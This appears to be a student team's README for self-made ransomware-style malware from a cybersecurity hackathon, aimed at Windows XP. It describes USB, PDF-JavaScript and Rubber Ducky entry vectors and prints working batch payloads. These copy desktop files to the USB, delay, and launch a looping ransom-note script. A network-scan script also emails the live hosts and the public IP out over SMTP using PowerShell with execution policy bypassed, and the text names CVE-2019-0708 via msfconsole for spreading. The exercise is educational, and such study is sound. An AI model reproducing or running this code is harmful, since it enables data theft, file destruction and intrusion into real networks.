# Man1f3zzt0

## Made by Ellioth Denzel Romero Martinez, Luis Daniel Filorio Luna, Miguel Soria, Omar Emiliano Sanchez Villegas, Sofia Moreno Lopez.

This piece of malware was created for a pseudo hackathon that aimed to teach students interested in cybersecurity how malware compromised big industry systems, especially legacy systems. 
The challenge proposed a case study where a pharmaceutical company let 3 threat actors posed as students enter their headquarters, and through social engineering managed to enter a usb into an employees computer. They printed a pdf file that was downloaded into the computer and after they left the first computer started showing a ransom note and lost access to its files. 
After some minutes the same started happening in other branches near the main HQ and after an hour it managed to infect their whole system.

The challenge was proposing a recovery plan and figuring out how they propagated through the system and compromised it, in an effort to give the best and most plausible solution my team and I got into the shoes of the threat actors and designed a malware to attack a windows xp system, there was no information about what system they were using but they challenge specified it was at least 20 years old and to this day windows xp is widely used around the world.



In the recon phase of the development we found 3 potential entry vectors, a misconfiguration of .inf files entering a system, a rubber ducky posing as a mass storage device and adobe acrobat executing JavaScript code embedded in pdf files.

These 3 entry vectors had one goal, to execute a malicious batch file that would copy our main malware into the system and execute it. The malicious file would then wait for 15 minutes before executing so the threat actors could exit the building.

## FIrst entry vector .inf files in the root of a usb - semi successful 

When a .inf file is in the root directory of a usb, it can run files instantly when placed inside a windows xp machine.
This vector proved somehow successful in early versions of windows XP, especially before windows xp SP2. The reason this wasn't our entry vector is that most configurations of windows xp for large systems have a registry that prompts a user input when a .inf is detected in the root directory of a usb system.


## Second entry vector Javascript code inside PDF - semi successful 

Most of the versions of Adobe Acrobat Reader that were built for Windows XP by default run JavaScript code embedded inside of any pdf file. 
Our first approach to this entry vector was successful, we managed to display an alert on the machine symply by opening the file on Adobe Acrobat and Windows Explorer.

This seemed like the best way to enter the system, but then when designing and testing a different payload that used the JS ActiveXObject constructor to call cmd commands, we got an error detailing that ActiveXObject was not declared in the system. 
With short time we tried using a different version of windows xp but the error kept happening, it wasn't solved even after letting adobe acrobat have every unsafe permission. 
With little time left we needed to change approaches.

## Third entry vector rubber ducky posing as mass storage device - ULTRA SUCCESSFUL

To this day this is one of the most efficient entry vectors, the only downside is you need physical access to the system you are trying to pawn and the case study told us the threat actors did, even though this was the most efficient approach we made it our last resource as we knew we could develop the script pretty easily. 

We used a HAK5 rubber ducky and payload studio pro to develop the simple chain of keystrokes that would run in the background as the pdf file was opened. 


This simple keystroke injection opened the doors to our payload. 


## Payload 

Our payload consisted of 3 batch files.  Each with its unique function. 

Our first batch file was made so we could run code even after unplugging the usb from the target machine. It copies our main caller into the desktop and executes it. 
We used system variables that got the username from the system and used it to define the PATH to the desktop, with this we didn't need to worry about knowing and hard coding the username.

```

xcopy "%~dp0\maincaller.bat" "%userprofile%\Desktop\" /Y
start "" "%userprofile%\Desktop\maincaller.bat"

```



The second batch file is a little more complex, firstly copies everything from the desktop into a file inside our usb.

```

@echo off
setlocal

:: Set variables
set USB_DRIVE=E:  :: Change this to the letter of your USB drive
set DESKTOP_DIR=%USERPROFILE%\Desktop
set DEST_DIR=%USB_DRIVE%\DesktopBackup
set FINAL_SCRIPT=%USB_DRIVE%\final_script.bat
set WAIT_TIME=60  :: Time to wait in seconds

:: Create destination directory on USB drive
if not exist %DEST_DIR% mkdir %DEST_DIR%

:: Copy Desktop contents to USB drive
xcopy "%DESKTOP_DIR%\*" "%DEST_DIR%\" /E /H /C /I

```

After this it will start a timeout to wait for the threat actors to leave the building
It will delete everything and start a cmd file that shows the ransom note.

```

ping -n 240 127.0.0.1
start cmd /c "main.bat"

:monitor

REM Delay for 2 seconds
ping -n 30 127.0.0.1 >nul

start cmd /c "man1f3zzt0.bat"

goto monitor

```

## Lateral movement 

The next part is only a prove of concept as we were running out of time. 
We will use the simple mail transfer protocol to send all of the local ips that are currently in use.

Firstly we ping all of the possible local ips using a CIDR of /24. 
If they respond we save it to a local variable and continue until finished.
After this we curl to http://ipinfo.io/ip, this will give us the public ip address of this network.

```

@echo off
setlocal

:: Set variables
set NETWORK_BASE=192.168.1.  :: Change this to your network base
set OUTPUT_FILE=%TEMP%\network_scan_results.txt
set PUBLIC_IP_FILE=%TEMP%\public_ip.txt
set EMAIL_TO=someone@example.com  :: Change this to the recipient's email address
set EMAIL_SUBJECT="Network Scan Results"
set SMTP_SERVER=smtp.example.com  :: Change this to your SMTP server
set SMTP_PORT=587                 :: Change this to your SMTP server port
set SMTP_USERNAME=your_email@example.com  :: Change this to your email
set SMTP_PASSWORD=your_password   :: Change this to your email password

:: Clear previous output files
if exist %OUTPUT_FILE% del %OUTPUT_FILE%
if exist %PUBLIC_IP_FILE% del %PUBLIC_IP_FILE%

:: Get public IP address
echo Retrieving public IP address...
curl -s http://ipinfo.io/ip > %PUBLIC_IP_FILE%

:: Scan the network
echo Scanning the network...
for /L %%i in (1,1,254) do (
    ping -n 1 -w 1000 %NETWORK_BASE%%%i | find "Reply from" >> %OUTPUT_FILE%
)

:: Append public IP to output file
echo Public IP Address: >> %OUTPUT_FILE%
type %PUBLIC_IP_FILE% >> %OUTPUT_FILE%

```


We package all of this and send it to a properly configured gmail address. 

```
:: Prepare PowerShell script to send email
set PS_SCRIPT=%TEMP%\send_email.ps1
echo $EmailFrom = "%SMTP_USERNAME%" > %PS_SCRIPT%
echo $EmailTo = "%EMAIL_TO%" >> %PS_SCRIPT%
echo $Subject = "%EMAIL_SUBJECT%" >> %PS_SCRIPT%
echo $Body = "Find the attached network scan results." >> %PS_SCRIPT%
echo $SMTPServer = "%SMTP_SERVER%" >> %PS_SCRIPT%
echo $SMTPPort = %SMTP_PORT% >> %PS_SCRIPT%
echo $SMTPUser = "%SMTP_USERNAME%" >> %PS_SCRIPT%
echo $SMTPPass = "%SMTP_PASSWORD%" >> %PS_SCRIPT%
echo $Attachment = "%OUTPUT_FILE%" >> %PS_SCRIPT%
echo $Message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo, $Subject, $Body >> %PS_SCRIPT%
echo $SMTP = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort) >> %PS_SCRIPT%
echo $SMTP.EnableSsl = $true >> %PS_SCRIPT%
echo $SMTP.Credentials = New-Object System.Net.NetworkCredential($SMTPUser, $SMTPPass) >> %PS_SCRIPT%
echo $Message.Attachments.Add((New-Object System.Net.Mail.Attachment($Attachment))) >> %PS_SCRIPT%
echo $SMTP.Send($Message) >> %PS_SCRIPT%

:: Execute the PowerShell script
powershell -ExecutionPolicy Bypass -File %PS_SCRIPT%

:: Clean up
del %OUTPUT_FILE%
del %PUBLIC_IP_FILE%
del %PS_SCRIPT%
endlocal

```


With all this info we can use the msfconsole to exploit the [CVE-2019-0708](https://nvd.nist.gov/vuln/detail/cve-2019-0708)

This vulnerability allows remote code execution and makes it extremely easy to propagate through the whole system.

All of this was made by my team and i in less than 20 hours, we learned a lot and are happy with the final product. 
